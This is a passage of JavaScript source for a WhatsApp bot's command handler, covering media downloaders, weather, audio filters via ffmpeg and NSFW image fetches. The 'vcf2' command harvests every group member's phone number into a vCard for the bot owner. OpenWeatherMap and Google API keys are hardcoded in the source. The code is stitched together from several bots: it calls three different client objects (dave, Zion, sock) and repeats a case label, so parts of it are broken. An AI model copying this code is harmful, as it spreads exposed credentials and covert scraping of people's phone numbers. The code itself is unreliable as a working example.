                console.error("Error triggering redeploy:", errorMessage);
            }
        }

        redeployApp();
    }
	break;
        
                        case 'autorecordtype':
                if (!isCreator) return reply(mess.owner)
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autorecordtype = true
                    reply(`Successfully changed auto recording and typing to ${q}`)
                } else if (q === 'off') {
                    autorecordtype = false
                    reply(`Successfully changed auto recording and typing to ${q}`)
                }
                break
                
        case 'video': {
  try {
    if (!text) return reply('What video do you want to download?');

    let videoUrl = '';
    let videoTitle = '';
    let videoThumbnail = '';

    if (text.startsWith('http://') || text.startsWith('https://')) {
      videoUrl = text;
    } else {
      const { videos } = await yts(text);
      if (!videos || videos.length === 0) return reply('No videos found!');
      videoUrl = videos[0].url;
      videoTitle = videos[0].title;
      videoThumbnail = videos[0].thumbnail;
    }

    const izumi = {
      baseURL: "https://izumiiiiiiii.dpdns.org"
    };

    const AXIOS_DEFAULTS = {
      timeout: 60000,
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'application/json, text/plain, */*'
      }
    };

    const tryRequest = async (getter, attempts = 3) => {
      let lastError;
      for (let attempt = 1; attempt <= attempts; attempt++) {
        try {
          return await getter();
        } catch (err) {
          lastError = err;
          if (attempt < attempts) {
            await new Promise(r => setTimeout(r, 1000 * attempt));
          }
        }
      }
      throw lastError;
    };

    const getIzumiVideoByUrl = async (youtubeUrl) => {
      const apiUrl = `${izumi.baseURL}/downloader/youtube?url=${encodeURIComponent(youtubeUrl)}&format=720`;
      const res = await tryRequest(() => axios.get(apiUrl, AXIOS_DEFAULTS));
      if (res?.data?.result?.download) return res.data.result;
      throw new Error('Izumi video API returned no download');
    };

    const getOkatsuVideoByUrl = async (youtubeUrl) => {
      const apiUrl = `https://okatsu-rolezapiiz.vercel.app/downloader/ytmp4?url=${encodeURIComponent(youtubeUrl)}`;
      const res = await tryRequest(() => axios.get(apiUrl, AXIOS_DEFAULTS));
      if (res?.data?.result?.mp4) {
        return {
          download: res.data.result.mp4,
          title: res.data.result.title
        };
      }
      throw new Error('Okatsu API returned no mp4');
    };

    // Send thumbnail
    try {
      const ytId = (videoUrl.match(/(?:youtu\.be\/|v=)([a-zA-Z0-9_-]{11})/) || [])[1];
      const thumb = videoThumbnail || (ytId ? `https://i.ytimg.com/vi/${ytId}/sddefault.jpg` : undefined);
      const captionTitle = videoTitle || text;

      if (thumb) {
        await dave.sendMessage(m.chat, {
          image: { url: thumb },
          caption: `*${captionTitle}*\n> _🏂searching video data..._`,
        }, { quoted: m });
      }
    } catch (e) {
      console.error('[VIDEO] Thumbnail Error:', e?.message || e);
    }

    // Validate YouTube URL
    const urls = videoUrl.match(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch\?v=|v\/|embed\/|shorts\/|playlist\?list=)?)([a-zA-Z0-9_-]{11})/gi);
    if (!urls) return reply('This is not a valid YouTube link!');

    // Try downloading video
    let videoData;
    try {
      videoData = await getIzumiVideoByUrl(videoUrl);
    } catch (e1) {
      console.warn('[VIDEO] Izumi failed, trying Okatsu:', e1?.message || e1);
      videoData = await getOkatsuVideoByUrl(videoUrl);
    }

    await dave.sendMessage(m.chat, {
      video: { url: videoData.download },
      mimetype: 'video/mp4',
      fileName: `${videoData.title || videoTitle || 'video'}.mp4`,
      caption: `*${videoData.title || videoTitle || 'Video'}*`,
    }, { quoted: m });

  } catch (error) {
    console.error('[VIDEO] Command Error:', error?.message || error);
    reply('Download failed: ' + (error?.message || 'Unknown error'));
  }
  break;
}
//==================================================//        
   case 'weather': {
		      try {

if (!text) return reply("provide a city/town name");

const response = await fetch(`http://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=1ad47ec6172f19dfaf89eb3307f74785`);
        const data = await response.json();

console.log("Weather data:",data);

        const cityName = data.name;
        const temperature = data.main.temp;
        const feelsLike = data.main.feels_like;
        const minTemperature = data.main.temp_min;
        const maxTemperature = data.main.temp_max;
        const description = data.weather[0].description;
        const humidity = data.main.humidity;
        const windSpeed = data.wind.speed;
        const rainVolume = data.rain ? data.rain['1h'] : 0;
        const cloudiness = data.clouds.all;
        const sunrise = new Date(data.sys.sunrise * 1000);
        const sunset = new Date(data.sys.sunset * 1000);

await m.reply(`❄️ Weather in ${cityName}

🌡️ Temperature: ${temperature}°C
📝 Description: ${description}
❄️ Humidity: ${humidity}%
🌀 Wind Speed: ${windSpeed} m/s
🌧️ Rain Volume (last hour): ${rainVolume} mm
☁️ Cloudiness: ${cloudiness}%
🌄 Sunrise: ${sunrise.toLocaleTimeString()}
🌅 Sunset: ${sunset.toLocaleTimeString()}`);

} catch (e) { reply("Unable to find that location.") }
  }
   break;
//==================================================//        
  case 'gitclone': {
		      if (!text) return m.reply(`Where is the link?`)
if (!text.includes('github.com')) return reply(`Is that a GitHub repo link ?!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user3, repo] = text.match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user3}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    await dave.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => reply("error"))

		    }
		      break; //==================================================//     
        case 'uptime':
  const uptime = process.uptime();
  const days = Math.floor(uptime / (24 * 3600));
  const hours = Math.floor((uptime % (24 * 3600)) / 3600);
  const minutes = Math.floor((uptime % 3600) / 60);
  const seconds = Math.floor(uptime % 60);
  dave.sendMessage(m.chat, { text: `Uptime: ${days}d ${hours}h ${minutes}m ${seconds}s` });
  break;
//==================================================//           
      case 'ping':
  const start = Date.now();
  const msg = await m.reply('Pinging...');
  const end = Date.now();
  const latency = end - start;
  m.reply(`Pong! Latency: ${latency}ms`);
  break; //==================================================//      
    case 'yts': case 'ytsearch': {
                if (!text) return reply(`Example : ${prefix + command} faded`)
                let yts = require("yt-search")
                let search = await yts(text)
                let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
                let no = 1
                for (let i of search.all) {
                    teks += `❤️ No : ${no++}\n❤️Type : ${i.type}\n ❤️Video ID : ${i.videoId}\n❤️ Title : ${i.title}\n❤️ Views : ${i.views}\n❤️ Duration : ${i.timestamp}\n❤️ Uploaded : ${i.ago}\n❤️ Url : ${i.url}\n\n─────────────────\n\n`
                }
                dave.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
            }
            break  
        
        case 'shorturl': {
const zlib = require('zlib');
const qs = require('querystring');      
const kualatshort = async (url) => {
  const res = await axios.post(
    'https://kua.lat/shorten',
    qs.stringify({ url }),
    {
      responseType: 'arraybuffer',
      headers: {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'id-ID,id;q=0.9,en-AU;q=0.8,en;q=0.7,en-US;q=0.6',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://kua.lat',
        'Referer': 'https://kua.lat/',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest'
      }
    }
  )

  let decoded
  const encoding = res.headers['content-encoding']

  if (encoding === 'br') {
    decoded = zlib.brotliDecompressSync(res.data)
  } else if (encoding === 'gzip') {
    decoded = zlib.gunzipSync(res.data)
  } else if (encoding === 'deflate') {
    decoded = zlib.inflateSync(res.data)
  } else {
    decoded = res.data
  }

  return JSON.parse(decoded.toString())
}
  
    try {
      if (!text) return m.reply('Use : .shorturl https://example.com')
      
      const result = await kualatshort(text)

      if (!result?.data?.shorturl) {
        return m.reply('failed to create url.')
      }

      reply(`🔗 *Short URL:*\n${result.data.shorturl}`)
    } catch (e) {
      console.error('[SHORTURL] Error:', e)
      reply(`Error: ${e.message}`)
    }
    break
  }
       
//==================================================//  

case 'anticallwhitelist':
case 'allowedcallers': {
    if (!daveshown) return reply(mess.owner);
    
    const ANTICALL_PATH = './library/database/anticall.json';
    
    try {
        // Initialize or load existing data
        let data = { enabled: false, whitelist: [] };
        if (fs.existsSync(ANTICALL_PATH)) {
            const fileContent = fs.readFileSync(ANTICALL_PATH, 'utf8');
            data = JSON.parse(fileContent || '{}');
        }
        if (!data.whitelist) data.whitelist = [];
        
        // Check if user is mentioned or quoted
        let targetUser;
        if (m.mentionedJid && m.mentionedJid.length > 0) {
            targetUser = m.mentionedJid[0];
        } else if (m.quoted) {
            targetUser = m.quoted.sender;
        } else {
            return reply('Please mention a user or reply to their message\nExample: .anticallwhitelist @user');
        }
        
        const username = targetUser.split('@')[0];
        
        // Toggle user in whitelist
        if (data.whitelist.includes(targetUser)) {
            // Remove from whitelist
            data.whitelist = data.whitelist.filter(u => u !== targetUser);
            fs.writeFileSync(ANTICALL_PATH, JSON.stringify(data, null, 2));
            reply(`❌ Removed @${username} from call whitelist\nThey will now be blocked if they call.`);
        } else {
            // Add to whitelist
            data.whitelist.push(targetUser);
            fs.writeFileSync(ANTICALL_PATH, JSON.stringify(data, null, 2));
            reply(`✅ Added @${username} to call whitelist\nThey can now call without being blocked.`);
        }
        
    } catch (err) {
        console.error('Whitelist error:', err);
        reply('❌ Error managing call whitelist');
    }
}
break;

case 'callwhitelist':
case 'showallowed': {
    if (!daveshown) return reply(mess.owner);
    
    const ANTICALL_PATH = './library/database/anticall.json';
    
    try {
        let data = { enabled: false, whitelist: [] };
        if (fs.existsSync(ANTICALL_PATH)) {
            const fileContent = fs.readFileSync(ANTICALL_PATH, 'utf8');
            data = JSON.parse(fileContent || '{}');
        }
        if (!data.whitelist) data.whitelist = [];
        
        if (data.whitelist.length === 0) {
            reply('📝 Call whitelist is empty\nNo users are allowed to call.');
        } else {
            const userList = data.whitelist.map(u => `• @${u.split('@')[0]}`).join('\n');
            reply(`📝 Call Whitelist (${data.whitelist.length} users):\n\n${userList}`);
        }
        
    } catch (err) {
        console.error('Whitelist view error:', err);
        reply('❌ Error reading call whitelist');
    }
}
break;


case 'goodbye': {
  if (!m.isGroup) return reply(mess.owner)
  if (!isAdmins) return reply(mess.admin)
  if (args[0] === "on") {
    if (db.data.chats[m.chat].goodbye) return reply('Already activated previously')
    db.data.chats[m.chat].goodbye = true
    reply('Successfully activated goodbye!')
  } else if (args[0] === "off") {
    if (!db.data.chats[m.chat].goodbye) return reply('Already deactivated previously')
    db.data.chats[m.chat].goodbye = false
    reply('Successfully deactivated goodbye!')
  } else {
    reply('Command not recognized. Use "on" to activate or "off" to deactivate.')
  }
}
break;              
//==================================================//   

// ===================== 🌐 DAVE MULTI FEATURE MODULE =====================

// Dependencies: axios, fs, fetchJson, CatBox, generateProfilePicture

// === MEDIAFIRE DOWNLOADER ===
case 'mediafire': case 'mfdl': {
  try {
    if (!text) return reply(`❌ Incorrect usage!\nExample: .mediafire <link>`);
    if (!text.includes('mediafire.com')) return reply('⚠️ Link must be a valid Mediafire URL.');

    await dave.sendMessage(m.chat, { react: { text: '🚀', key: m.key } });

    const api = await fetchJson(`https://api.vreden.web.id/api/mediafiredl?url=${text}`);
    const data = api.result?.[0];
    const fileName = decodeURIComponent(data?.nama || 'file.zip');
    const ext = fileName.split('.').pop().toLowerCase();

    const res = await axios.get(data.link, { responseType: 'arraybuffer' });
    const fileBuffer = Buffer.from(res.data);

    let mimeType = 'application/octet-stream';
    if (ext === 'mp4') mimeType = 'video/mp4';
    else if (ext === 'mp3') mimeType = 'audio/mp3';

    await dave.sendMessage(
      m.chat,
      { document: fileBuffer, fileName, mimetype: mimeType },
      { quoted: m }
    );

  } catch (err) {
    reply('❌ Error: ' + err.message);
  }
}
break;

// === GITHUB CLONE ===


// ============Converter
            case 'bass':
			case 'blown':
			case 'deep':
			case 'earrape':
			case 'fast':
			case 'fat':
			case 'nightcore':
			case 'reverse':
			case 'robot':
			case 'slow':
			case 'smooth':
			case 'tupai': {
				try {
					let set
					if(/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
					if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
					if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
					if (/earrape/.test(command)) set = '-af volume=12'
					if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
					if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
					if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
					if (/reverse/.test(command)) set = '-filter_complex "areverse"'
					if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
					if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
					if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
					if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
					if (/audio/.test(mime)) {
						await Zion.sendMessage(m.chat, {
							react: {
								text: "⏱️",
								key: m.key,
							}
						})
						let media = await Zion.downloadAndSaveMediaMessage(quoted)
						let ran = getRandom('.mp3')
						exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
							fs.unlinkSync(media)
							if (err) return m.reply(err)
							let buff = fs.readFileSync(ran)
							Zion.sendMessage(m.chat, {
								audio: buff,
								mimetype: 'audio/mpeg'
							}, {
								quoted: m
							})
							fs.unlinkSync(ran)
						})
					} else m.reply(`Reply to the audio you want to convert with the caption *${prefix + command}*`)
				} catch (error) {
					 
				}
			}
			break
			
			//============ Sound
    case 'sound1':
    case 'sound2':
    case 'sound3':
    case 'sound4':
    case 'sound5':
    case 'sound6':
    case 'sound7':
    case 'sound8':
    case 'sound9':
    case 'sound10':
    case 'sound11':
    case 'sound12':
    case 'sound13':
    case 'sound14':
    case 'sound15':
    case 'sound16':
    case 'sound17':
    case 'sound18':
    case 'sound19':
    case 'sound20':
    case 'sound21':
    case 'sound22':
    case 'sound23':
    case 'sound24':
    case 'sound25':
    case 'sound26':
    case 'sound27':
    case 'sound28':
    case 'sound29':
    case 'sound30':
    case 'sound31':
    case 'sound32':
    case 'sound33':
    case 'sound34':
    case 'sound35':
    case 'sound36':
    case 'sound37':
    case 'sound38':
    case 'sound39':
    case 'sound40':
    case 'sound41':
    case 'sound42':
    case 'sound43':
    case 'sound44':
    case 'sound45':
    case 'sound46':
    case 'sound47':
    case 'sound48':
    case 'sound49':
    case 'sound50':
    case 'sound51':
    case 'sound52':
    case 'sound53':
    case 'sound54':
    case 'sound55':
    case 'sound56':
    case 'sound57':
    case 'sound58':
    case 'sound59':
    case 'sound60':
    case 'sound61':
    case 'sound62':
    case 'sound63':
    case 'sound64':
    case 'sound65':
    case 'sound66':
    case 'sound67':
    case 'sound68':
    case 'sound69':
    case 'sound70':
    case 'sound71':
    case 'sound72':
    case 'sound73':
    case 'sound74':
    case 'sound75':
    case 'sound76':
    case 'sound77':
    case 'sound78':
    case 'sound79':
    case 'sound80':
    case 'sound81':
    case 'sound82':
    case 'sound83':
    case 'sound84':
    case 'sound85':
    case 'sound86':
    case 'sound87':
    case 'sound88':
    case 'sound89':
    case 'sound90':
    case 'sound91':
    case 'sound92':
    case 'sound93':
    case 'sound94':
    case 'sound95':
    case 'sound96':
    case 'sound97':
    case 'sound98':
    case 'sound99':
    case 'sound100':
    case 'sound101':
    case 'sound102':
    case 'sound103':
    case 'sound104':
    case 'sound105':
    case 'sound106':
    case 'sound107':
    case 'sound108':
    case 'sound109':
    case 'sound110':
    case 'sound111':
    case 'sound112':
    case 'sound113':
    case 'sound114':
    case 'sound115':
    case 'sound116':
    case 'sound117':
    case 'sound118':
    case 'sound119':
    case 'sound120':
    case 'sound121':
    case 'sound122':
    case 'sound123':
    case 'sound124':
    case 'sound125':
    case 'sound126':
    case 'sound127':
    case 'sound128':
    case 'sound129':
    case 'sound130':
    case 'sound131':
    case 'sound132':
    case 'sound133':
    case 'sound134':
    case 'sound135':
    case 'sound136':
    case 'sound137':
    case 'sound138':
    case 'sound139':
    case 'sound140':
    case 'sound141':
    case 'sound142':
    case 'sound143':
    case 'sound144':
    case 'sound145':
    case 'sound146':
    case 'sound147':
    case 'sound148':
    case 'sound149':
    case 'sound150':
    case 'sound151':
    case 'sound152':
    case 'sound153':
    case 'sound154':
    case 'sound155':
    case 'sound156':
    case 'sound157':
    case 'sound158':
    case 'sound159':
    case 'sound160':
    case 'sound161':
    case 'sound162':
    case 'sound163':
    case 'sound164':
    case 'sound165':
    case 'sound166':
    case 'sound167':
    case 'sound168':
    case 'sound169':
    case 'sound170':
    case 'sound171':
    case 'sound172':
    case 'sound173':
    case 'sound174':
    case 'sound175':
    case 'sound176':
    case 'sound177':
    case 'sound178':
    case 'sound179':
    case 'sound180':
    case 'sound181':
    case 'sound182':
    case 'sound183':
    case 'sound184':
    case 'sound185':
    case 'sound186':
    case 'sound187':
    case 'sound188':
    case 'sound189':
    case 'sound190':
    case 'sound191':
    case 'sound192':
    case 'sound193':
    case 'sound194':
    case 'sound195':
    case 'sound196':
    case 'sound197':
    case 'sound198':
    case 'sound199':
    case 'sound200':
    case 'sound201':
    case 'sound202':
    case 'sound203':
    case 'sound204':
    case 'sound205':
    case 'sound206':
    case 'sound207':
    case 'sound208':
    case 'sound209':
    case 'sound210':
    case 'sound211':
    case 'sound212':
    case 'sound213':
    case 'sound214':
    case 'sound215':
    case 'sound216':
    case 'sound217':
    case 'sound218':
    case 'sound219':
    case 'sound220':
    case 'sound221':
    case 'sound222':
    case 'sound223':
    case 'sound224':
    case 'sound225':
    case 'sound226':
    case 'sound227':
    case 'sound228':
    case 'sound229':
    case 'sound230':
    case 'sound231':
    case 'sound232':
    case 'sound233':
    case 'sound234':
    case 'sound235':
    case 'sound236':
    case 'sound237':
    case 'sound238':
    case 'sound239':
    case 'sound240':
    case 'sound241':
    case 'sound242':
    case 'sound243':
    case 'sound244':
    case 'sound245':
    case 'sound246':
    case 'sound247':
    case 'sound248':
    case 'sound249':
    case 'sound250': {
try {
        let link = `https://raw.githubusercontent.com/Leoo7z/Music/main/${command}.mp3`
        await Zion.sendMessage(m.chat, {
          audio: {
            url: link
          },
          mimetype: 'audio/mpeg'
        }, {
          quoted: m
        })
      } catch (err) {
        m.reply(`Terjadi kesalahan: ${err}`)
      }
    }
    break
    
// === PASTEBIN FETCH ===
case 'getpastebin': case 'getpb': {
  if (!text) return reply(`🔗 Example:\n.getpb https://pastebin.com/raw/abc123`);
  try {
    const res = await fetch(`https://api.nekorinn.my.id/tools/getpastebin?url=${encodeURIComponent(text)}`);
    const json = await res.json();
    if (!json.status) return reply('⚠️ Failed to fetch data from Pastebin.');

    const content = json.result.content
      .split('\n')
      .filter(line => !line.trim().startsWith('//'))
      .join('\n');

    const preview = content.length > 4000 ? content.slice(0, 4000) + '\n\n📌 (Auto-truncated)' : content;

    const msg = generateWAMessageFromContent(m.chat, {
      viewOnceMessage: {
        message: {
          interactiveMessage: proto.Message.InteractiveMessage.create({
            header: {
              title: '📄 Pastebin Content',
              subtitle: 'Extracted from your link',
              hasMediaAttachment: false
            },
            body: { text: preview },
            footer: { text: `Powered by ${botName}` },
            nativeFlowMessage: {
              buttons: [{
                name: 'cta_copy',
                buttonParamsJson: JSON.stringify({
                  display_text: '📋 Copy All Content',
                  copy_code: content.slice(0, 10000)
                })
              }]
            }
          })
        }
      }
    }, { userJid: m.chat, quoted: m });

    await dave.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
  } catch (err) {
    reply(`❌ Error fetching Pastebin content: ${err.message}`);
  }
}
break;

// === SCREENSHOT WEBSITE ===
case 'ssweb': case 'ss-web': {
  if (!text) return reply(`Example: ${command} https://example.com`);
  await dave.sendMessage(
    m.chat,
    {
      image: { url: `https://api.siputzx.my.id/api/tools/ssweb?url=${text}&theme=light&device=desktop` },
      caption: footer
    },
    { quoted: m }
  );
}
break;

// === SNACKVIDEO DOWNLOADER ===
case 'snackvideo': case 'sv': {
  if (!text) return reply(`❌ Example: ${prefix + command} https://snackvideo.com/somevideo`);

  try {
    const res = await fetch(`https://api.siputzx.my.id/api/d/snackvideo?url=${text}`);
    const data = await res.json();
    if (!data?.data?.length) return reply(`⚠️ No media found.`);

    for (const item of data.data) {
      const head = await axios.head(item.url);
      const mime = head.headers['content-type'];

      if (/image/.test(mime)) {
        await dave.sendMessage(m.chat, { image: { url: item.url }, caption: '✅ Image downloaded successfully.' }, { quoted: m });
      } else if (/video/.test(mime)) {
        await dave.sendMessage(m.chat, { video: { url: item.url }, caption: '🎥 Video downloaded successfully.' }, { quoted: m });
      } else {
        await reply(`⚠️ Unsupported media type: ${mime}`);
      }
    }
  } catch (err) {
    reply(`❌ Error: ${err.message}`);
  }
}
break;

// === CAPCUT DOWNLOADER ===
case 'capcut': case 'cc': {
  if (!text) return reply(`❌ Example: ${prefix + command} <CapCut Link>`);

  try {
    const res = await fetch(`https://api.siputzx.my.id/api/d/capcut?url=${text}`);
    const data = await res.json();
    if (!data?.data?.length) return reply(`⚠️ No media found.`);

    for (const item of data.data) {
      const head = await axios.head(item.url);
      const mime = head.headers['content-type'];

      if (/image/.test(mime)) {
        await dave.sendMessage(m.chat, { image: { url: item.url }, caption: '✅ Image downloaded successfully.' }, { quoted: m });
      } else if (/video/.test(mime)) {
        await dave.sendMessage(m.chat, { video: { url: item.url }, caption: '🎥 Video downloaded successfully.' }, { quoted: m });
      } else {
        await reply(`⚠️ Unsupported media type: ${mime}`);
      }
    }
  } catch (err) {
    reply(`❌ Error: ${err.message}`);
  }
}
break;

// === FACE BLUR ===
case 'faceblur': case 'blurface': {
  if (!quoted) return reply(`⚠️ Please reply to an image.`);
  if (!/image/.test(mime)) return reply(`Reply with an image and caption ${prefix + command}`);

  const media = await dave.downloadAndSaveMediaMessage(quoted);
  const response = await CatBox(media);

  await dave.sendMessage(
    m.chat,
    { image: { url: `https://api.siputzx.my.id/api/iloveimg/blurface?image=${response}` }, caption: footer },
    { quoted: m }
  );
}
break;

// === BING IMAGE GENERATOR ===

case "vcf2": {
  if (!isOwner) return reply(mess.owner);
  if (!text) return m.reply("Please provide the group ID.");

  let res = await dave.groupMetadata(m.chat);
  const members = await res.participants
    .filter(v => v.id.endsWith('.net'))
    .map(v => v.id);

  for (let mem of members) {
    if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
      contacts.push(mem);
      fs.writeFileSync('./lib/database/contacts.json', JSON.stringify(contacts));
    }
  }

  try {
    const uniqueContacts = [...new Set(contacts)];
    const vcardContent = uniqueContacts.map((contact, index) => {
      const vcard = [
        "BEGIN:VCARD",
        "VERSION:3.0",
        `FN:${nama} - ${contact.split("@")[0]}`,
        `TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
        "END:VCARD",
        "",
      ].join("\n");
      return vcard;
    }).join("");

    fs.writeFileSync("./lib/database/contacts.vcf", vcardContent, "utf8");
  } catch (err) {
    m.reply(err.toString());
  } finally {
    if (m.chat !== m.sender)
      await m.reply(`✅ *Successfully created the contact file!*
The contact file has been sent to your private chat.
Total contacts: *${members.length}*`);

    await dave.sendMessage(
      m.sender,
      {
        document: fs.readFileSync("./lib/database/contacts.vcf"),
        fileName: "contacts.vcf",
        caption: `✅ Contact file created successfully.\nTotal contacts: *${members.length}*`,
        mimetype: "text/vcard",
      },
      { quoted: m }
    );

    contacts.splice(0, contacts.length);
    await fs.writeFileSync("./lib/database/contacts.json", JSON.stringify(contacts));
    await fs.writeFileSync("./lib/database/contacts.vcf", "");
  }
}
break;

case 'neko':
case 'shinobu':
case 'megumin':
case 'bully':
case 'cuddle':
case 'cry':
case 'hug':
case 'awoo':
case 'kiss':
case 'lick':
case 'pat':
case 'smug':
case 'bonk':
case 'yeet':
case 'blush':
case 'smile':
case 'wave':
case 'highfive':
case 'handhold':
case 'nom':
case 'bite':
case 'glomp':
case 'slap':
case 'kill':
case 'happy':
case 'wink':
case 'poke':
case 'dance':
case 'cringe':
case 'trap':
case 'blowjob':
case 'hentai':
case 'boobs':
case 'ass':
case 'pussy':
case 'thighs':
case 'lesbian':
case 'lewdneko':
case 'cum': {
  if (!isOwner && !isPremium) return reply(mess.prem);
  m.reply("Loading 🔁");

  try {
    let data = await fetchJson(`https://rule34.xxx/index.php?page=dapi&s=post&q=index&tags=${command}&json=1`);
    if (data && data[0]?.file_url) {
      let imgUrl = data[0].file_url;
      dave.sendMessage(
        m.chat,
        { image: { url: imgUrl }, caption: foother },
        { quoted: m }
      );
    }
  } catch (err) {
    try {
      let nsfw = await fetchJson(`https://api.waifu.pics/nsfw/${command}`);
      if (nsfw.url) {
        dave.sendMessage(
          m.chat,
          { image: { url: nsfw.url }, caption: foother },
          { quoted: m }
        );
      }
    } catch (err) {
      let sfw = await fetchJson(`https://api.waifu.pics/sfw/${command}`);
      if (sfw.url) {
        dave.sendMessage(
          m.chat,
          { image: { url: sfw.url }, caption: foother },
          { quoted: m }
        );
      }
    }
  }
}
break;

case 'imagebing': case 'bingimage': case 'imgbing': case 'bingimg': {
  if (!args.length) return reply('❌ Enter your prompt!\nExample: .imgbing red sports car');

  const query = encodeURIComponent(args.join(' '));
  const url = `https://beta.anabot.my.id/api/ai/bingImgCreator?prompt=${query}&apikey=freeApikey`;

  try {
    await dave.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
    const res = await fetch(url);
    const data = await res.json();

    if (data.status !== 200 || !data.data.result.length)
      return reply('⚠️ No images found!');

    for (const img of data.data.result) {
      await dave.sendMessage(m.chat, { image: { url: img }, caption: '🎨 Generated Image' }, { quoted: m });
    }

    await dave.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
  } catch (err) {
    reply('❌ Error fetching image: ' + err.message);
  }
}
break;
        
        case 'setprefix':
                if (!daveshown) return reply (mess.owner)
                if (!text) return reply(`Example : ${prefix + command} desired prefix`)
                global.xprefix = text
                reply(`Prefix successfully changed to ${text}`)
                break
//==================================================//              
        case "desc": case "setdesc": { 
                 if (!m.isGroup) return reply (mess.group)
                 if (!isAdmins) return reply ("bot must be admin in this group")
                 if (!text) throw 'Provide the text for the group description' 
                 await dave.groupUpdateDescription(m.chat, text); 
 m.reply('Group description successfully updated! 🥶'); 
             } 
 break; 
//==================================================//      


case "setnamabot":
case "setbotname": {
    if (!isOwner) {
        return reply(mess.owner); // Only the owner can use this
    }
    if (!text) {
        return reply(`Where is the name?\nExample: ${prefix + command} 𝘿𝙖𝙫𝙚𝘼𝙄`);
    }
    await sock.updateProfileName(text);
    reply(`Successfully changed the bot's number name`);
}
break;

case "setbiobot":
case "setbotbio": {
    if (!isOwner) {
        return reply(mess.owner); // Only the owner can use this
    }
    if (!text) {
        return reply(`Where is the text?\nExample: ${prefix + command} 𝘿𝙖𝙫𝙚𝘼𝙄`);
    }
    await sock.updateProfileStatus(text);
    reply(`Successfully changed the bot's number bio`);
}
break;


// === Delete Bot Profile Picture ===
case 'delppbot':
case "setbiobot": {
  if (!isOwner) return reply(mess.owner);
  await sock.removeProfilePicture(sock.user.id);
  reply(`Successfully deleted the bot's profile picture`);
}
break;

// === Set Bot Profile Picture ===
case 'removal':
case 'removebg': {
  if (!quoted) return reply(`Where’s the photo?`)
  if (!/image/.test(mime)) return reply(`Send or reply to an image with caption ${prefix + command}`)
  daveReact()
  let media = await dave.downloadAndSaveMediaMessage(quoted)
  let response = await CatBox(media)
  await dave.sendMessage(
    m.chat,
    {
      image: {
        url: `https://api.siputzx.my.id/api/iloveimg/removebg?image=${response}`
      },
      caption: footer
    },
    { quoted: m }
  )
}
break

case 'emojimix': {
  let [emoji1, emoji2] = q.split`+`
  if (!emoji1 || !emoji2)
    return reply(`❌ Wrong usage!\nExample: .emojimix 😄+😏`)
  reply("Processing...")
  let anu = await fetchJson(
    `https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`
  )
  for (let res of anu.results) {
    let encmedia = await dave.sendImageAsSticker(m.chat, res.url, m, {
      packname: footer,
      author: nama,
      categories: res.tags
    })
    await fs.unlinkSync(encmedia)
  }
}
break

case 'setppbot': {
  if (!isOwner) return reply(mess.owner)
  if (!/image/.test(mime))
    return reply(`Send/Reply to an image with caption ${prefix + command}`)
  if (/webp/.test(mime))
    return reply(`Send/Reply to an image with caption ${prefix + command}`)

  var medis = await dave.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
  if (text == 'full') {
    var { img } = await generateProfilePicture(medis)
    await dave.query({
      tag: 'iq',
      attrs: {
        to: botNumber,
        type: 'set',
        xmlns: 'w:profile:picture'
      },
      content: [
        {
          tag: 'picture',
          attrs: { type: 'image' },
          content: img
        }
      ]
    })
    fs.unlinkSync(medis)
    reply("Done updating bot profile picture (full mode)")
  } else {
    var memeg = await dave.updateProfilePicture(botNumber, { url: medis })
    fs.unlinkSync(medis)
    reply(mess.done)
  }
}
break

case 'joingc':
case 'join': {
  if (!isOwner) return reply(mess.owner)
  if (!text) return m.reply("Where’s the group link?")
  if (!text.includes("chat.whatsapp.com")) return m.reply("Invalid WhatsApp group link!")
  let result = text.split('https://chat.whatsapp.com/')[1]
  let id = await dave.groupAcceptInvite(result)
